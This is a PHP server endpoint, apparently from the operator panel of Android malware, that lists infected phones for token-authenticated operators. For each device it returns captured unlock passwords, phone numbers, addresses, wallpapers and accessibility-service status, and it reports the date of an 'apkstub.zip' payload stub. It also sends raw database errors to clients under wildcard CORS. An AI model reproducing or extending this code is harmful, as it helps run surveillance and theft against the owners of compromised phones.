<?php

date_default_timezone_set('Asia/Shanghai');

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Content-Type: application/json");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit();
}

// 获取请求体中的 token 参数
$data = json_decode(file_get_contents('php://input'), true);
$token = isset($data['token']) ? $data['token'] : '';

if (!$token) {
    http_response_code(401);
    echo json_encode(['error' => '未提供 token']);
    exit();
}


require_once '../private/Eaod85401.php';

try {
    $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // 查找当前用户
    $stmt = $pdo->prepare("SELECT * FROM users WHERE token = :token");
    $stmt->bindParam(':token', $token, PDO::PARAM_STR);
    $stmt->execute();
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$user) {
        http_response_code(401);
        echo json_encode(['error' => '无效 token']);
        exit();
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input = json_decode(file_get_contents('php://input'), true);
        $page = isset($input['page']) ? (int)$input['page'] : 1;
        $pageSize = isset($input['pageSize']) ? (int)$input['pageSize'] : 10;
        $offset = ($page - 1) * $pageSize;

        $isAdmin = ($user['usrname'] === 'admin');
        $usrname = $user['usrname'];

        // ✅ 构造 SQL 过滤条件
        $whereSql = '';
        $params = [];

        $isAdmin = ($user['usrname'] === 'admin');
        $usrname = $user['usrname'];

        // ✅ 构造 SQL 过滤条件
        $whereSql = '';
        $params = [];

        // if ($user['usrname'] === 'admin') {
        //     $whereSql = 'WHERE isonline = 1';
        // } else {
        //     $whereSql = 'WHERE usrname = :usrname AND isonline = 1 AND phoneopen = 1';
        //     $params[':usrname'] = $usrname;
        // }
        if ($user['usrname'] === 'admin') {
            $whereSql = 'WHERE 1 = 1';
        } else {
            $whereSql = 'WHERE usrname = :usrname AND phoneopen = 1';
            $params[':usrname'] = $usrname;
        }

        // ✅ 动态追加过滤条件
        if (!empty($input['usrname'])) {
            $whereSql .= ' AND usrname LIKE :usrnameSearch';
            $params[':usrnameSearch'] = '%' . $input['usrname'] . '%';
        }
        if (!empty($input['phone_name'])) {
            $whereSql .= ' AND phone_name LIKE :phone_name';
            $params[':phone_name'] = '%' . $input['phone_name'] . '%';
        }
        if (!empty($input['country'])) {
            $whereSql .= ' AND country LIKE :country';
            $params[':country'] = '%' . $input['country'] . '%';
        }
        if (!empty($input['model'])) {
            $whereSql .= ' AND model LIKE :model';
            $params[':model'] = '%' . $input['model'] . '%';
        }
        if (isset($input['accessibility']) && $input['accessibility'] !== '') {
            $whereSql .= ' AND accessibility = :accessibility';
            $params[':accessibility'] = $input['accessibility'];
        }
        // if (isset($input['last_ping']) && $input['last_ping'] !== '') {
        //     $currentTime = $input['last_ping']; // 获取前端传递的在线/离线标识

        //     if ($currentTime == 0) {
        //         // 如果前端传递的是0，表示在线，过滤 last_ping 小于 15 秒的设备
        //         $whereSql .= ' AND TIMESTAMPDIFF(SECOND, last_ping, NOW()) < 15';
        //     } elseif ($currentTime == 1) {
        //         // 如果前端传递的是1，表示离线，过滤 last_ping 大于 15 秒的设备
        //         $whereSql .= ' AND TIMESTAMPDIFF(SECOND, last_ping, NOW()) > 15';
        //     }
        // }
        if (!empty($input['install_date'])) {
            $whereSql .= ' AND install_date LIKE :install_date';
            $params[':install_date'] = '%' . $input['install_date'] . '%';
        }

        // 获取总数
        $totalSql = "SELECT COUNT(*) FROM phones $whereSql";
        $totalStmt = $pdo->prepare($totalSql);
        foreach ($params as $key => $val) {
            $totalStmt->bindValue($key, $val);
        }
        $totalStmt->execute();
        $total = (int)$totalStmt->fetchColumn();
        $pageCount = ceil($total / $pageSize); // ✅ 先定义

        // 获取分页数据
        $sql = "
            SELECT 
                phone_id, usrname, phone_name, android_ver, model, wallpaper, 
                phonepassword, phonenumber, battery_charg, network, install_date, 
                last_ping, address, country, phoneopen, activities, accessibility
            FROM phones
            $whereSql
            ORDER BY install_date DESC, phone_id ASC  -- 按安装日期降序排序，若相同则按 phone_id 升序
            LIMIT :limit OFFSET :offset
        ";
        $stmt = $pdo->prepare($sql);
        foreach ($params as $key => $val) {
            $stmt->bindValue($key, $val);
        }
        $stmt->bindValue(':limit', $pageSize, PDO::PARAM_INT);
        $stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
        $stmt->execute();
        $phones = $stmt->fetchAll(PDO::FETCH_ASSOC);

        foreach ($phones as &$phone) {
            if (isset($phone['wallpaper']) && isBase64($phone['wallpaper'])) {
                $phone['wallpaper'] = 'data:image/jpeg;base64,' . $phone['wallpaper'];
            } else {
                $phone['wallpaper'] = '';
            }
        }
        // ✅ 获取文件最后修改时间
        $filePath = "C:/xampp/htdocs/private/apkstub/apkstub.zip"; 
        $fileLastModified = null;
        
        if (file_exists($filePath)) {
            $fileLastModified = date("Y-m-d H:i:s", filemtime($filePath));
        }
        echo json_encode([
            'data' => $phones,
            'total' => $total,
            'pageCount' => $pageCount, 
            'fileLastModified' => $fileLastModified
        ]);
    } else {
        http_response_code(405);
        echo json_encode(['error' => 'Invalid request method.']);
    }
} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(['error' => $e->getMessage()]); // ✅ 直接返回错误详情
    file_put_contents("log.txt", "异常：" . $e->getMessage() . "\n", FILE_APPEND);
}

function isBase64($str)
{
    return preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $str) && strlen($str) % 4 === 0;
}
